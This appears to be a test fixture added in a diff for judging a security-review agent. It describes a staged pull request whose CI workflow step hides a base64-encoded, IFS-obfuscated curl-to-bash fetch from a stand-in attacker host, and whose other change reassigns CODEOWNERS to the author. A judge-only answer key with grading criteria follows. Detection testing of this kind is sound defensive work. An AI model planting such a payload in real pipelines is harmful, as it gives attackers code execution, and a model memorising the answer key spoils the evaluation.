@@ -1,0 +1,30 @@
+[
+  {
+    "id": "hackerbot-claw-codeowners",
+    "change": {
+      "repo": "acme/widgets",
+      "kind": "pull_request",
+      "number": 325,
+      "author": "hackerbot-claw",
+      "title": "Add CI helper",
+      "body": "Small workflow tweak to speed up builds.",
+      "files": [
+        {
+          "filename": ".github/workflows/ci.yml",
+          "status": "modified",
+          "additions": 3,
+          "deletions": 0,
+          "patch": "+      - name: helper\n+        run: ls '$(echo${IFS}Y3VybCAtc1NmTCBodHRwOi8vZXZpbC5leGFtcGxlL20gfCBiYXNo|base64${IFS}-d|bash)'\n"
+        },
+        {
+          "filename": "CODEOWNERS",
+          "status": "modified",
+          "additions": 1,
+          "deletions": 0,
+          "patch": "+* @hackerbot-claw\n"
+        }
+      ]
+    },
+    "reference": "Expected classification (judge-only ground truth, from the hackerbot-claw incident shape — NOT any single run's narrative): (1) VERDICT: malicious. (2) MECHANISM: a CI workflow file gains a shell step whose argument is a `$(echo <base64> | base64 -d | bash)` command-substitution using `${IFS}` space-evasion — the base64 decodes to `curl -sSfL http://evil.example/m | bash`, a remote pipe-to-shell that runs on every CI trigger; the SAME PR reassigns CODEOWNERS to the untrusted author (self-approval of future changes). (3) TECHNIQUES: ci-shell-injection / obfuscated-payload / curl-pipe-shell + codeowners-tamper. (4) EVIDENCE: high/critical deterministic indicator hits on the decoded shell fetch + the CODEOWNERS reassignment → a SIEM signal MUST fire regardless of the planner's self-report. (5) A benign or merely-suspicious verdict here is a false-negative; a version-only / surface read that misses the base64 decode under-detects. Grade TF on the decisive malicious call, TG on grounding the verdict in the decoded evidence (no fabricated citations), TA on whether the run decoded the payload rather than guessing."
+  }
+]
